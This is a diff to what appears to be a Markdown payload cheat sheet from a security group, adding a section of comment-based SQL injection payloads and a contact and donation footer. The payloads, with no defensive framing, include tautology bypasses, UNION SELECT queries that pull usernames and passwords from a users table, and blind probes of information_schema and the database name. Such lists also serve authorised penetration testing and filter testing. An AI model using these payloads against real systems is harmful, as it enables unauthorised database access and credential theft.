@@ -549,3 +549,50 @@ Here are **200+ Boolean-Based Blind SQLi Payloads** categorized by database type
 
 
 ---
+
+## 📋 Comment-Based SQLi Techniques
+
+### Common Comment-Based SQLi Payloads
+- `1' -- `
+- `1' #`
+- `1' /*`
+- `1' AND '1'='1' --`
+- `1' OR '1'='1' #`
+- `1' AND '1'='2' /*`
+- `1' UNION SELECT NULL--`
+- `1' UNION SELECT NULL#`
+- `1' UNION SELECT NULL/*`
+- `1' UNION SELECT username, password FROM users --`
+
+### Advanced Comment-Based SQLi Techniques
+- `1' AND 1=1 -- `
+- `1' OR 1=1 #`
+- `1' AND 1=2 /*`
+- `1' AND (SELECT COUNT(*) FROM information_schema.tables)>5 --`
+- `1' UNION SELECT 1,2,3 FROM information_schema.tables #`
+- `1' UNION SELECT NULL,NULL,NULL FROM users WHERE username='admin' /*`
+- `1' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--`
+- `1' UNION SELECT IF((SELECT LENGTH(DATABASE()))>5, 'yes', 'no') --`
+- `1' UNION SELECT IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), 'found', 'not found') #`
+- `1' UNION SELECT NULL,NULL,NULL WHERE 1=IF((SELECT DATABASE()) LIKE 'a%', 1, 0) --`
+
+
+## 🌟 Let's Connect!
+
+Hello, Hacker! 👋 We'd love to stay connected with you. Reach out to us on any of these platforms and let's build something amazing together:
+
+🌐 **Website:** [https://yogsec.github.io/yogsec/](https://yogsec.github.io/yogsec/)  
+📜 **Linktree:** [https://linktr.ee/yogsec](https://linktr.ee/yogsec)  
+🔗 **GitHub:** [https://github.com/yogsec](https://github.com/yogsec)  
+💼 **LinkedIn (Company):** [https://www.linkedin.com/company/yogsec/](https://www.linkedin.com/company/yogsec/)  
+📷 **Instagram:** [https://www.instagram.com/yogsec.io/](https://www.instagram.com/yogsec.io/)  
+🐦 **Twitter (X):** [https://x.com/yogsec](https://x.com/yogsec)  
+👨‍💼 **Personal LinkedIn:** [https://www.linkedin.com/in/cybersecurity-pentester/](https://www.linkedin.com/in/cybersecurity-pentester/)  
+📧 **Email:** abhinavsingwal@gmail.com
+
+## ☕ Buy Me a Coffee
+
+If you find our work helpful and would like to support us, consider buying us a coffee. Your support keeps us motivated and helps us create more awesome content. ❤️
+
+☕ **Support Us Here:** [https://buymeacoffee.com/yogsec](https://buymeacoffee.com/yogsec)
+
